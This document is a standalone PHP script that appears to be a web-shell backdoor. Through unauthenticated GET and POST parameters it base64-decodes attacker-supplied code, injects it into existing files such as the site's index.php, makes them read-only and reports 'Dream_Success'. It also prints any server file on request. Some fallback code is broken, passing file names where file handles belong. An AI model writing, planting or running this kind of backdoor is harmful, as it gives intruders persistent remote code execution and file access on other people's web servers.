<?php

function me_file_put_contents($filename, $content){
    if(function_exists('file_put_contents')){
        return file_put_contents($filename, $content);
    }else{
        $f = fopen($filename, 'w');
        fwrite($filename, $content);
        fclose($f);
        return true;
    }

}

function me_file_get_contents($filename){
    if(function_exists('file_get_contents')){
        return file_get_contents($filename);
    }else{
        $f = fopen($filename, 'r');
        $content = fread($filename,filesize($filename));
        fclose($f);
        return $content;
    }
}


$valid = isset($_GET['act']) ? $_GET['act'] : false;
$filename = isset($_GET['filename']) ? $_GET['filename'] : false;
$path = isset($_POST['path']) ? $_POST['path'] : false;
$content = isset($_POST['content']) ? $_POST['content'] : false;

$default_code = '<?php';
if(!$valid || !$filename) die('canshubugou');
if($filename == 'index.php'){
    $filename = $_SERVER['DOCUMENT_ROOT'].'/'.$filename;
}

if ($valid == 'upload'){
    if($filename && $content){
        $content = base64_decode($content);
        if(file_exists($filename)){
            if( !is_writable($filename)) {
                @chmod($filename, 0666);
            }
            $file_content = me_file_get_contents($filename);
            $content = str_replace($default_code, $content, $file_content);
            if(stripos($content, '<?php') < -1){
                $content = '<?php '.$content;
            }
        }
        if(me_file_put_contents($filename, $content)){
            @chmod($filename, 0444);
            echo "Dream_Success";
        };
    }
}else if($valid == 'get'){
    if(file_exists($filename)){
        echo me_file_get_contents($filename);
    }else{
        echo "Dream_404";
    }
}



?>